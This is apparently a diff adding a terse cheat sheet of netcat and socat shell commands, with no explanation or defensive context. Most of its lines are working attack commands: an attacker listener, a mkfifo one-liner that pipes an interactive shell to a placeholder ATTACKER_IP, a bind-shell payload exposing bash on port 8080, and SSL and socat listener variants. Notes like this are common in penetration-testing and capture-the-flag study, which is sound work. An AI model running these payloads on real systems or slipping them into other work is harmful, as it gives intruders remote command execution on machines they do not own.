@@ -1,0 +1,20 @@
+REVERSE SHELL :
+
+    ATTACKER LISTEN VIA NETCAT : nc -lvnp PORT_NUM
+
+    PIPE REVERSE SHELL PAYLOAD : rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+
+
+BIND SHELL : 
+
+    PAYLOAD : rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+
+    CONNECT : nc -nv Target_IP 8080
+
+
+TOOLS FOR BETTER INTERACTION : rlwrap nc -lvnp PORT_NUM
+
+TOOLS FOR SSL : ncat --ssl -lvnp PORT_NUM
+
+SOCKET CREATION : socat -d -d TCP-LISTEN:PORT_NUM  STDOUT
+
